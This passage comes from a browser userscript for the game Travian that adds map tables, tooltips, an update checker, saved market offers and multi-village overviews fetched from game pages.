							td.addEventListener("click", sortTable('tabla_mapa', i, 'int'), 0);
							break;
						default:
							td.addEventListener("click", sortTable('tabla_mapa', i), 0);
					}
					td.style.cursor = "pointer";
				}
				fila.appendChild(td);
			}
			var datos = 0;
			var area;
			for (var i = 0; i < 7; i++)
				for (var j = 0; j < 7; j++)
				{
					area = get('a_' + i + '_' + j).wrappedJSObject;//.getAttribute('details');//lmc.ad[i][j];
					var cellinfo = area.details;
					if (cellinfo && cellinfo.name != null)
					{
						datos = 1;
						var inforow = $elem('TR');
						var href = area.href;

						inforow.appendChild($elem('TD', cellinfo.name));
						inforow.appendChild($elem('TD', cellinfo.ally));
						inforow.appendChild($elem('TD', '<a href="' + href + '">' + cellinfo.dname + '</a>'));
						inforow.appendChild($elem('TD', cellinfo.ew));
						//				inforow.appendChild($elem('TD', '<a href="' + href + '">' + cellinfo.x + ", " + cellinfo.y + '</a>'));
						var td = $elem('TD', '<a href="' + href + '">' + cellinfo.x + ", " + cellinfo.y + '</a>');
						//var mover = 'getVillageDist("' + cellinfo.x + '", "' + cellinfo.y + '")';
						td.addEventListener("mouseover", getVillageDist(cellinfo.x, cellinfo.y), 0);
						td.addEventListener("mouseout", function()
						{
							clearTimeout(timeout);
							get("tb_tooltip").style.display = 'none';
						}, 0);
						inforow.appendChild(td);
						//				inforow.appendChild($elem('TD', '<a href="' + href.replace("karte.php?d", "a2b.php?z") + '">' + T('ATACAR') + '</a> / <a href="' + href.replace("karte.php?d", "build.php?z") + '&gid=17">' + T('COMERCIAR') + '</a>'));
						inforow.appendChild($elem('TD', '<a href="' + href.replace("karte.php?d", "a2b.php?z") + "><img src='" + img('a/att_all.gif') + "'width='12' title='" + T('ATACAR') + "'></a> |<a href=" + href.replace("karte.php?d", "build.php?z") + "&gid=17><img src='" + img('r/4.gif') + "' height='12' title='" + T('COMERCIAR') + "'></a>"));
						tbody.appendChild(inforow);
					}
				}
			table.appendChild(tbody);
			if (datos == 1)
			{
				var middleblock = get('lmidall');
				if(textDirection != "rtl")
				{
					middleblock.appendChild($elem('BR'));
				}else
				{
					var TableY = longitudPantalla() + 'px';
					table.style.top = TableY;
					table.style.position = "absolute";
				}
				middleblock.appendChild(table);
	        }
		}

		function genMapInfoBlock()
		{
			var mapinfo = get("map_info");
			if (mapinfo)
			{
				removeElement(mapinfo);
			}
			var firstpos = get("a_0_6").href.match(/d=(\d+)/).pop();
			mapinfo = $elem("div", "", {"id": "map_info"});
			for (var i = 1; i < 50; i++)
			{
				var divs = $elem('div', '<div id="map_info_' + i + '" t="0" style="position:relative;left:31px;top:48px;z-index: 90;border: solid 1px #00C000; background-color: #FEFFE3;-moz-border-radius: 8px; display: none"></div>',{
					"class": 'mt' + i
				}, {
					"zIndex": 2
				}, mapinfo)
			}
			get("a_0_6").parentNode.appendChild(mapinfo);
		}

		genMapTable();
		desplazarMapa();
		crearTooltip();
		var mapcontent = get('map_content');
		var casillas = find("//div[@class='mdiv' and @style='z-index: 2;']/img", XPList, mapcontent); // areatypeimage
		var areas = find("//map//area[@shape='poly' and (@coords)]", XPList, mapcontent);
		if (areas.snapshotLength > 0)
		{
			genMapInfoBlock();

			var oasisdata = '';
			for (var i = 0; i < casillas.snapshotLength; i++)
			{
				var area = areas.snapshotItem(i);
				if (casillas.snapshotItem(i).src.match(/\/o(\d+)\.gif/))
				{
					var otype = casillas.snapshotItem(i).src.match(/\/o(\d+)\.gif/).pop();
					//   if (otype!='') {
					//       var pos = area.href.match(/d=(\d+)/).pop();
					//	    oasisdata+="&pos="+pos+"&value="+(Number(otype)+10);
					//    }
				}
			}
		}
	}

	/** Mises à jour la position de l'info-bulle. Il ne peut y avoir seulement une info-bulle à la fois parce qu'il ya seulement un pointeur cours */
	function updateTooltip(e)
	{
		var div = get("tb_tooltip");
		if (div.clientWidth != 0 && e.pageX + 5 + div.clientWidth - document.documentElement.scrollLeft > document.documentElement.clientWidth)
			div.style.left = (e.pageX - 5 - div.clientWidth) + "px";
		else
			div.style.left = (e.pageX + 5) + "px";

		if (div.clientHeight != 0 && e.pageY + 5 + div.clientHeight - document.documentElement.scrollTop > document.documentElement.clientHeight)
			div.style.top = (e.pageY - 5 - div.clientHeight) + "px";
		else
			div.style.top = (e.pageY + 5) + "px";
	}

	/** Il crée l'objet utilisé pour obtenir de l'information de info-bulle */
	function crearTooltip()
	{
		$elem("DIV", "", {
			"id": "tb_tooltip"
		}, {
			"position": "absolute",
			"display": "block",
			"padding": "4px",
			"zIndex": 100,
			"border": "1px solid #00C000",
			"backgroundColor": "#FEFFE3",
			"display": "none"
		}, $tags('body')[0]);

		// Solo puede haber un tooltip simultaneamente
		document.addEventListener("mousemove", updateTooltip, 0);
	}

	// Def and crop of nature from http://www.kirilloid.ru/travian
	var def1 = [25, 35, 40, 66, 70, 80, 140, 380, 170, 440];
	var def2 = [10, 40, 60, 50, 33, 70, 200, 240, 250, 520];
	var crop = [1, 1, 1, 1, 2, 2, 3, 3, 3, 5];

	function createTooltip1()
	{
		var div = $elem("DIV", "", {
			"id": "tb_nature"
		}, {
			"position": "absolute",
			"display": "block",
			"padding": "4px",
			"zIndex": 500,
			"border": "1px solid #00C000",
			"backgroundColor": "#FEFFE3",
			"display": "none"
		}, $tags("body")[0]);
		document.addEventListener("mousemove", updateTooltip1, 0);
	}

	function updateTooltip1(e)
	{
		var div = get("tb_nature");
		div.style.left = (e.pageX + 16) + "px";
		div.style.top = (e.pageY + 4) + "px";
	}


	/** Fonction qui fait une demande asynchrone XML
	 *
	 * Params:
	 *	url: Direccion a la que realizar la peticion
	 *	method: Metodo de la peticion. Puede ser GET o POST
	 *	param: Parametros codificados como URI (solo con POST, null si no se usan)
	 *	onSuccess: Funcion a invocar cuando se reciba el resultado
	 *	onFailure: Funcion a invocar si la peticion falla
	 */
	function ajaxRequest(url, method, param, onSuccess, onFailure)
	{
		var xmlHttpRequest = new XMLHttpRequest();
		xmlHttpRequest.onreadystatechange = function()
		{
			if (xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200 && onSuccess != null)
				onSuccess(xmlHttpRequest);
			else
				if (xmlHttpRequest.readyState == 4 && xmlHttpRequest.status != 200 && onFailure != null)
					onFailure(xmlHttpRequest);
		};
		xmlHttpRequest.open(method, url, true);
		xmlHttpRequest.url = url;
		if (method == 'POST')
			xmlHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttpRequest.send(param);
	}

	function checkUpdate()
	{ // par Mik french
		var b = find("//td[@class='menu']", XPFirst);
		var div = $elem("DIV", "<a target='_blank'; href='http://userscripts.org/scripts/show/26429'><b>Version " + SCRIPT.version + "</b></a>", {}, {}, b);
		var div2 = $elem("DIV", "", {}, {}, div);
		var a = $elem("A", T('UPDATE_CHECK'), {"href": "javascript:void(0)"}, {}, div2);
		a.addEventListener('click', foo = function()
		{
			updateScript(SCRIPT);
		}, false);
	}

	/**update the script (by Richard Gibson)*/
	function updateScript(SCRIPT)
	{ //target='_blank'
		try
		{
			if (!GM_getValue)
				return;
			GM_xmlhttpRequest({
				method: 'GET',
				url: SCRIPT.url + '?source', // don't increase the 'installed' count just for checking
				onload: function(result)
				{
					if (result.status != 200)
						return;
					if (!result.responseText.match(/@version\s+([\d.]+)/))
						return;
					var theOtherVersion = parseFloat(RegExp.$1);
					if (theOtherVersion == parseFloat(SCRIPT.version))
					{
						alert(T('LAST_VERSION') + ' (v' + SCRIPT.version + ')');
						return;
					}
					else
						if (theOtherVersion < parseFloat(SCRIPT.version))
						{
							alert('Version en test (beta ' + SCRIPT.version + ')');
							return;
						}
						else
						{
							if (confirm(T('NEW_VERSION') + ' (v' + theOtherVersion + ')!\n\n' + T('UPDATE_NOW') + '?\n'))
							{
								window.location.href = SCRIPT.url;
							}
						}
				}
			});
		}
		catch (ex)
		{
		}
	}

	function mostrarVentas()
	{
		if (!find("//input[@type='hidden' and @name='t' and @value='2']", XPFirst))
			return;
		find("//form", XPFirst).setAttribute("name", "sell");

		find("//select[@name='rid2']", XPFirst).setAttribute("class", "fm");//TMR - fix the class on this
		var a = find("//input[@type='image' and @name='s1']", XPFirst);
		a.addEventListener("click", function()
		{
			var param = ["m1", "m2", "rid1", "rid2", "d2"];
			var checks = ["d1", "ally"];
			var values = new Array();
			for (var i = 0; i < param.length; i++)
				eval("values[" + i + "] = find(\"//*[@name='" + param[i] + "']\", XPFirst).value");
			for (var i = 0; i < checks.length; i++)
			{
				try
				{
					eval("var b = find(\"//*[@name='" + checks[i] + "']\", XPFirst).checked");
					if (b == true)
						values[i + param.length] = '1';
					else
						values[i + param.length] = '0';
				}
				catch (e)
				{
				}
			}
			agregarElementoCookie("ventas", values);
		}, 0);

		var ventas = obtenerValorCookie("ventas");
		if (ventas.length > 0)
		{
			var tabla = $elem("TABLE", "", {
				"id": "ventas",
				"class": "tbg",
				"align": "center",
				"cellspacing": 1,
				"cellpadding": 2
			});

			var tr = $elem("TR", "", {},{
				"fontWeight": "bold",
				"backgroundImage": "url("+ imagenes["c2"] + ")"
			}, tabla);
			//tr.setAttribute("class", "rbg");
			var columnas = [T('OFREZCO'), T('BUSCO'), T('MAXTIME'), T('ALIANZA'), T('VENDER'), T('ELIMINAR')];
			for (var i = 0; i < columnas.length; i++)
				tr.appendChild($elem("TD", columnas[i]));

				for (var i = 0; i < ventas.length; i++)
			{
				var tr = $elem("TR");

				//# TMR
				td = $elem("TD", '<img src="' + img('/r/' + (ventas[i][2]) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (ventas[i][2])) + '"> ' + ventas[i][0]);
				tr.appendChild(td);
				td = $elem("TD", '<img src="' + img('/r/' + (ventas[i][3]) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (ventas[i][3])) + '"> ' + ventas[i][1]);
				tr.appendChild(td);

				td = $elem("TD", ventas[i][5] == '1' ? ventas[i][4] : T('NO'));
				tr.appendChild(td);
				td = $elem("TD", ventas[i][6] == '1' ? T('SI') : T('NO'));
				tr.appendChild(td);

				td = $elem("TD", '<a href="javascript:void(0);" onClick="sell.m1.value=' + ventas[i][0] + ';sell.m2.value=' + ventas[i][1] + ';sell.rid1.value=' + ventas[i][2] + ';sell.rid2.value=' + ventas[i][3] + ';sell.d2.value=' + ventas[i][4] + ';sell.d1.checked=' + (ventas[i][5] == '1') + (ventas[i][6] ? ';sell.ally.checked=' + (ventas[i][6] == '1') : '') + ';sell.submit();"><img src="' + imagenes["ok1"] + '" title="' + T('VENDER') + '" alt="' + T('VENDER') + '" border="0"></a>');
				tr.appendChild(td);
				tabla.appendChild(tr);

				//# TMR
				var enlace = $elem("A", " <img src='" + img('/a/del.gif') + "' width='12' height='12' border='0' title='" + T('ELIMINAR') + "'>");

				enlace.href = "javascript:void(0);";
				enlace.addEventListener("click", crearEventoEliminarCookie("ventas", i, mostrarVentas), 0);
				var td = $elem("TD");
				td.appendChild(enlace);
				tr.appendChild(td);
				;
			}
			insertAfter(a, tabla);
		}
	}

	function borrarCuenta()
	{
		//var a = find("//div[@class='f10' and parent::td[@class='s3'] and @style]", XPFirst);
		//if (a) a.setAttribute("style", "position:absolute; display: block; padding: 4px; z-index: 2; border: solid 1px #00C000; background-color: #FEFFE3; width:130px; text-align:center; right:0px; top:0px;");
		var a = find("//p[parent::div[@id='lleft'] and @style]", XPFirst);
		if (a)
		{
			moveElement(a, document.body);
			a.setAttribute("style", "position:absolute; display: block; padding: 4px; z-index: 2; border: solid 1px #00C000; background-color: #FEFFE3; width:130px; text-align:center; right:0px; top:0px;");
		}
	}

	function opcionMenuSuperior(texto)
	{
		//var a = find("//td[@class='s3']/p", XPFirst);
		var a = find("//p[@class='txt_menue']", XPFirst);
		if (a)
			a.innerHTML += texto;
	}

	function opcionOcultaAlianza()
	{
		if (find("//td[@class='s3']/p", XPList).snapshotLength > 1)
			opcionMenuSuperior(' | <a href="allianz.php?s=7">' + T('STAT') + '</a>');
	}

	function opcionOcultaMensajes()
	{
		if (!plus)
			opcionMenuSuperior(' | <a href="nachrichten.php?t=3">' + T('ARCHIVE') + '</a>');
	}

	function opcionOcultaInformes()
	{
		if (!plus)
			opcionMenuSuperior(' | <a href="berichte.php?t=5">' + T('ARCHIVE') + '</a>');
	}

	function MapaQuickSave()
	{
		// Intenta insertarlos en la lista derecha, si no existe la crea
		var ba = find("//div[@class='map_details_actions']//table[@class='f10' and @width='100%']//tr", XPFirst);
		if (!ba)
			return;
		var enlace = $elem("A", '\u00BB ' + T('MP'), {"href": "javascript:void(0)"});
		var tr = $elem("TR");
		var td = $elem("TD");
		// Al anyadir se pide el texto y el enlace, si se cancela o se deja vacio alguno se aborta
		// Despues de insertar se refresca la lista volviendola a insertar
		enlace.addEventListener("click", function()
		{
			var a = window.location;
			var b = prompt(T('TEXTO'));
			if (b == null || b == '' || b == 'undefined')
				return;
			agregarElementoCookie("marcadores", [b, a]);
			removeElement('marcadores');
			mostrarMarcadores();
		}, 0);
		td.appendChild(enlace);
		tr.appendChild(td);
		ba.parentNode.appendChild(tr);
	}

	/**  Ensemble des fonctions pour dorf3. "Info Villages" */
	if (travplus == false || travplus == null)
	{
		function resumomenu()
		{
			var ba = find("//div[@id='lright1']", XPFirst);
			if (!ba)
				return;

			var p = find("//p[@class='txt_menue']", XPFirst);
			p.innerHTML = p.innerHTML.match(/<a.*\/a>/) + ' |\n'+
			'<a href="dorf3.php?s=0">' + T("MINI") + '</a> |\n<a href="dorf3.php?s=3">' + T("RESS") + '</a> |\n'+
			'<a href="dorf3.php?s=2">' + T("DEP") + '</a> |\n<a href="dorf3.php?s=1">' + T("PC") + '</a> |\n'+
			'<a href="dorf3.php?s=5">' + T("TROP") + '</a> |\n<a href="dorf3.php?s=7">' + T("FT") + '</a> |\n'+
			'<a href="dorf3.php?s=4">' + T("MAN") + '</a> |\n<a href="dorf3.php?s=9">(+)</a>';
			tabela = find("//table[@class='tbg']", XPFirst).innerHTML;
			return tabela;
		}
	}


	/** Tableau globale */
	function crearEventoActualizarAldeaGeneric(did, endUrl, callBack, buildDorf)
	{
		var page = buildDorf ? "build.php" : "dorf1.php";
		if (did)
			var newdid = "?newdid=";
		else
		{	var newdid = "";
			endUrl[0] = "?";
		}
		return function()
		{
			find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b3.gif');
			ajaxRequest(page + newdid + did + endUrl, "GET", null, callBack, function()
			{
				find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b4.gif');
			});
		};
	}


	/** Tableau globale */
	function crearEventoActualizarAldea(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarAldea, 0);}

	/** Tableau dépot */
	function crearEventoActualizarAldea1(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarArmazem, 0); }

	/** Tableau mini */
	function crearEventoActualizarAldea2(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarAldeaMini, 0);}

	/** Tableau troupes */
	function crearEventoActualizarAldea3(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarTropas, 0);}

	/** Tableau PC */
	function crearEventoActualizarAldea4(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=25&s=4', procesarPC, 1); }

	function crearEventoActualizarAldea4b(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=26&s=4', procesarPCb, 1); }

	/** Tableau ressource */
	function crearEventoActualizarAldea5(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarArmazembis, 0); }

	/** Tableau fete */
	function crearEventoActualizarAldea6(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=24', procesarPF, 1); }

	/** Tableau Manoir */
	function crearEventoActualizarAldea7(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=37&land', procesarMA, 1);}

	function crearEventoActualizarAldeaF(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=24', procesarF, 1); }

	function crearEventoActualizarAldeaM(did){ return crearEventoActualizarAldeaGeneric(did, '&gid=17', procesarM, 1); }

	/** info dorf1*/
	function crearEventoActualizarAldeaT(did){ return crearEventoActualizarAldeaGeneric(did, '', procesarT, 0); }

	function procesarAldea(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}
		var times = new Array();

		villeinfo = readCookie("villeinfo" + server);
		if (villeinfo == true || villeinfo == null)
		{
			// Materias primas simplifié
			var a = '';
			for (var i = 1; i < 5; i++)
			{
				var b = get("l" + (5 - i), ansdoc);
				var perc = Math.round((b.innerHTML.split("/")[0] * 100) / b.innerHTML.split("/")[1]);
				var cant = b.innerHTML.split("/")[0];
				var color = '';
				if (perc > 0)
				{
					color = '<font color=green>';
				}
				if (perc > 10)
				{
					color = '<font color=black>';
				}
				if (perc > 69)
				{
					color = '<font color=orange>';
				}
				if (perc > 98)
				{
					color = '<font color=red>';
				}
				// Espero que la "k" sea internacional
				if (cant % 1000 == 0)
					txt_cant = (cant / 1000) + "k";
				else
					txt_cant = cant;
				var c = '';
				c += '<img src="' + img('r/' + i + '.gif') + '" border="0" title="' + T('RECURSO' + i) + '">';
				c += '<span style="font-size:15px" title="' + b.innerHTML + '">' + color + '(' + perc + '%)</span>';
				a += '<nobr>' + c + '</nobr>';
				if (i != 4)
					a += '<font color=#DCDCDC>' + " | " + '</font>';
			}
			find("//td[@id='aldea" + did + "_0" + "']", XPFirst).innerHTML = a;
		}

		villeinfo = readCookie("villeinfo" + server);
		if (villeinfo == false || villeinfo == null)
		{
			// Materias primas complet
			var a = '';
			for (var i = 1; i < 5; i++)
			{
				var b = get("l" + (5 - i), ansdoc);
				var perc = Math.round((b.innerHTML.split("/")[0] * 100) / b.innerHTML.split("/")[1]);
				var cant = b.innerHTML.split("/")[0];
				var color = '';
				if (perc > 0)
				{
					color = '<font color=black>';
				}
				if (perc > 98)
				{
					color = '<font color=red>';
				}
				// Espero que la "k" sea internacional
				if (cant % 1000 == 0)
					txt_cant = (cant / 1000) + "k";
				else
					txt_cant = cant;
				var c = '';
				c += '<img src="' + img('r/' + i + '.gif') + '" border="0" title="' + T('RECURSO' + i) + '">';
				c += '<span style="font-size:16px" title="' + b.title + '">' + (cant < 0 ? '<font color="#ff0000">' + txt_cant + '</font>' : txt_cant) + '</span> <span style="font-size:10px" title="' + b.innerHTML + '">' + (color + '(' + perc) + '%)</span>';
				a += '<nobr>' + c + '</nobr>';
				if (i != 4)
					a += '<font color=#DCDCDC>' + " | " + '</font>';
			}
			find("//td[@id='aldea" + did + "_0" + "']", XPFirst).innerHTML = a;
		}

		// Ataques
		var casilla = find("//td[@id='aldea" + did + "_1" + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='ltbw1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (!a)
			var a = ansdoc.evaluate("//div[@id='ltbw0']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var a = a.firstChild;
			var b = new Array();
			for (var i = 0; i < a.childNodes.length; i++)
			{
				var tr = a.childNodes[i];
				// FIXME: Apanyo para FF. Firefox mete nodos vacios
				var error = (tr.childNodes.length == 5 ? false : true);
				times.push(tr.childNodes[error ? 9 : 4].textContent.split(" ")[0]);
				b[i] = '<nobr><a href="build.php?newdid=' + did + '&gid=16" title="' + tr.childNodes[error ? 3 : 1].textContent.split(" ")[1] + '">' + tr.childNodes[error ? 1 : 0].firstChild.innerHTML + "</a> <span style='font-size:13px; color:#2F4F4F' id='timeouta'>" + tr.childNodes[error ? 9 : 4].textContent.split(" ")[0] + '</span></nobr>';
			}
			casilla.innerHTML = b.join(" | ");
		}
		else
			casilla.innerHTML = '-';

		// Construcciones
		var casilla = find("//td[@id='aldea" + did + "_2" + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='lbau1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var b = new Array();
			for (var i = 0; i < a.firstChild.childNodes.length; i++)
			{
				times.push(a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0]);
				b[i] = '<nobr><img src="' + img('a/bau.gif') + '" width="11" border="0"  title="' + a.firstChild.childNodes[i].childNodes[1].innerHTML + '"/> <span style="font-size:16px; color:#666666" id="timeouta">' + a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0] + "</span></nobr>";
			}
			casilla.innerHTML = b.join(" | ");
		}
		else
			casilla.innerHTML = '-';

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
		find("//span[@class='c2']", XPFirst).removeAttribute("class");
		find("//a[contains(@href, '" + did + "') and ancestor::div[@id='lright1']]", XPFirst).parentNode.firstChild.className = 'c2';

		// Auto Refresh
		if (times.length > 0)
		{
			var time = Number.POSITIVE_INFINITY;
			for (var i = 0; i < times.length; i++)
			{
				times[i] = calcular_segundos(times[i]);
				if (times[i] < time)
					time = times[i];
			}
		}
		// FIXME: Firefox rendering bug
		casilla.parentNode.setAttribute("style", "width:100%");
	}

	function procesarArmazem(t){ return procesarArmazemGeneric(t, false); }
	function procesarArmazembis(t){ return procesarArmazemGeneric(t, true); }

	function procesarArmazemGeneric(t, percentual)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}

		// Materias primas
		var tmpStr = '';
		var c = 1;
		var Tiempos = new Array(4);
		for (var i = 4; i > 0; i--)
		{
			var b = get("l" + i, ansdoc);
			var d = get("l" + i, ansdoc).title;
			var qtd = '';
			if(percentual)
			{
				var cant = b.innerHTML.split("/")[0];
				if (cant % 1000 == 0)
					qtd = (cant / 1000) + "k";
				else
					qtd = cant;
			}
			var perc = Math.round((b.innerHTML.split("/")[0] * 100) / b.innerHTML.split("/")[1]);
			var perc1 = (b.innerHTML.split("/")[0]);
			var perc2 = (b.innerHTML.split("/")[1]);
			var neg = '';
			var color = 'black';
			if (perc > 60)
				color = 'orange';
			else if (perc > 90)
				color = 'red';
			else if (perc < 20)
				color = 'green';

			tmpStr = '<nobr><span style="font-size:13px;" title="' + b.innerHTML.split("/")[0] + '/' + b.innerHTML.split("/")[1] + ' + ' + d + '"><b><font color="'+color+'">';
			if(percentual)
				tmpStr += qtd;
			else
				tmpStr += perc + '%';
			tmpStr += '</font></b></span></nobr>';
			if (d < 0)
				var tiempo = Math.round((perc1 / -d) * 3600);
			// Si la produccion es 0, el tiempo es infinito
			else
				if (d == 0)
					var tiempo = -1;
				// Si la produccion es negativa, se calcula el tiempo hasta el vaciado
				else
					var tiempo = Math.round(((perc2 - perc1) / d) * 3600);
			Tiempos[i] = tiempo;

			if (i > 1)
				find("//td[@id='aldea" + did + "_" + c + "']", XPFirst).innerHTML = tmpStr;
			c++;

			if (i == 2)
			{
				var min = Tiempos[4];
				for (j = 4; j > 1; j--)
					if (Tiempos[j] < min)
						min = Tiempos[j];
				clock = "<span style='font-size:10px; id='timeouta'>" + formatear_tiempo(min) + "</span>";

				var tiempoRestante = calculateHighlight(1, min, clock);
				find("//td[@id='aldea" + did + "_" + 4 + "']", XPFirst).innerHTML = tiempoRestante;
			}

			if (i == 1)
			{
				find("//td[@id='aldea" + did + "_" + 5 + "']", XPFirst).innerHTML = tmpStr;
				var tiempoRestante = calculateHighlight(d, tiempo, "<span style='font-size:10px; id='timeouta'>" + formatear_tiempo(tiempo) + "</span>");
				find("//td[@id='aldea" + did + "_" + 6 + "']", XPFirst).innerHTML = tiempoRestante;
			}
		}

		// Construcciones
		var casilla = find("//td[@id='aldea" + did + "_" + 7 + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='lbau1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var b = new Array();
			for (var i = 0; i < a.firstChild.childNodes.length; i++)
				b[i] = '<nobr><img src="' + img('a/bau.gif') + '" title="' + a.firstChild.childNodes[i].childNodes[1].innerHTML + " " + a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0] + '"></nobr>';
			casilla.innerHTML = b.join(" ");
		}
		else
			casilla.innerHTML = '-';

		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
		find("//span[@class='c2']", XPFirst).removeAttribute("class");
		find("//a[contains(@href, '" + did + "') and ancestor::div[@id='lright1']]", XPFirst).parentNode.firstChild.className = 'c2';

		// FIXME: Firefox rendering bug
		casilla.parentNode.setAttribute("style", "width:100%");
	}

	function procesarAldeaMini(t)
	{
		// Carga la pagina resultado en un arbol DOM para hacer busquedas por XPath
		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);

		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}
		var times = new Array();

		// Ataques
		var casilla = find("//td[@id='aldea" + did + "_0" + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='ltbw1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (!a)
			var a = ansdoc.evaluate("//div[@id='ltbw0']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var a = a.firstChild;
			var b = new Array();
			for (var i = 0; i < a.childNodes.length; i++)
			{
				var tr = a.childNodes[i];
				// FIXME: Apanyo para FF. Firefox mete nodos vacios
				var error = (tr.childNodes.length == 5 ? false : true);
				times.push(tr.childNodes[error ? 9 : 4].textContent.split(" ")[0]);
				b[i] = '<nobr><a href="build.php?newdid=' + did + '&gid=16" title="' + tr.childNodes[error ? 3 : 1].textContent.split(" ")[1] + '">' + tr.childNodes[error ? 1 : 0].firstChild.innerHTML + "</a> <span style='font-size:14px' id='timeouta'>" + tr.childNodes[error ? 9 : 4].textContent.split(" ")[0] + '</span></nobr>';
			}
			casilla.innerHTML = b.join(" | ");
		}
		else
			casilla.innerHTML = '-';

		// Construcciones
		var casilla = find("//td[@id='aldea" + did + "_1" + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='lbau1']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue;
		if (a)
		{
			var b = new Array();
			for (var i = 0; i < a.firstChild.childNodes.length; i++)
			{
				times.push(a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0]);
				b[i] = '<nobr><img src="' + img('a/bau.gif') + '" title="' + a.firstChild.childNodes[i].childNodes[1].innerHTML + '"/> <span id="timeouta">' + a.firstChild.childNodes[i].childNodes[2].textContent.split(" ")[0] + "</span></nobr>";
			}
			casilla.innerHTML = b.join(" ");
		}
		else
			casilla.innerHTML = '-';

		// Tropas
		var casilla = find("//td[@id='aldea" + did + "_2" + "']", XPFirst);
		var a = ansdoc.evaluate("//div[@id='ltrm']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue.firstChild;
		if (a.firstChild.childNodes.length == 3)
		{
			var b = new Array();
			for (var i = 0; i < a.childNodes.length; i++)
			{
				var tr = a.childNodes[i];
				tr.childNodes[0].firstChild.firstChild.setAttribute("title", tr.childNodes[2].innerHTML + " " + tr.childNodes[1].innerHTML.split(">")[1].split("<")[0]);
				b[i] = '<nobr>' + tr.childNodes[0].firstChild.innerHTML + '</nobr>';
			}
			casilla.innerHTML = b.join("");
		}
		else
			casilla.innerHTML = '-';


		find("//img[@id='aldea" + did + "_boton']", XPFirst).src = img('a/b2.gif');
		find("//span[@class='c2']", XPFirst).removeAttribute("class");
		find("//a[contains(@href, '" + did + "') and ancestor::div[@id='lright1']]", XPFirst).parentNode.firstChild.className = 'c2';
		// FIXME: Firefox rendering bug
		casilla.parentNode.setAttribute("style", "width:100%");
	}

	function procesarTropas(t)
	{

		var ansdoc = document.implementation.createDocument("", "", null);
		var ans = $elem('DIV', t.responseText, {}, {}, ansdoc);
		var a = ''
		// ID de aldea
		try
		{	ansdoc.evaluate("//a[@class='active_vl']", ans, null, XPFirst, null).singleNodeValue.getAttribute("href").search(/\?newdid=(\d+)/);
			var did = RegExp.$1;
		}
		catch(e)
		{	var did = lonelyTownNEWDID;
		}
		var times = new Array();

		find("//td[@id='aldea" + did + "_0" + "']", XPFirst).innerHTML = a;
		// Tropas complet
		var casilla = find("//td[@id='aldea" + did + "_0" + "']", XPFirst); //class="b f16"
		var a = ansdoc.evaluate("//div[@id='ltrm']//table[@class='f10']", ans, null, XPFirst, null).singleNodeValue.firstChild;
		if (a.firstChild.childNodes.length == 3)
		{
			var b = new Array();
			for (var i = 0; i < a.childNodes.length; i++)
			{
				var tr = a.childNodes[i];
				tr.childNodes[0].firstChild.firstChild.setAttribute("title", tr.childNodes[2].innerHTML);
				b[i] = '<nobr>' + tr.childNodes[0].firstChild.innerHTML + '<span style="font-size:13px">' + tr.childNodes[1].innerHTML + '</nobr>';
			}
			casilla.innerHTML = b.join(" | ");
		}
		else
			casilla.innerHTML = '-';

		find("//td[@id='aldea" + did + "_1" + "']", XPFirst).innerHTML = '<a href="build.php?gid=16&newdid=' + did + '"><img src="' + img('/a/b4.gif') + '" width="5" ></a>';

			// céréale
		{
			var a = '';
			for (var i = 4; i < 5; i++)
			{
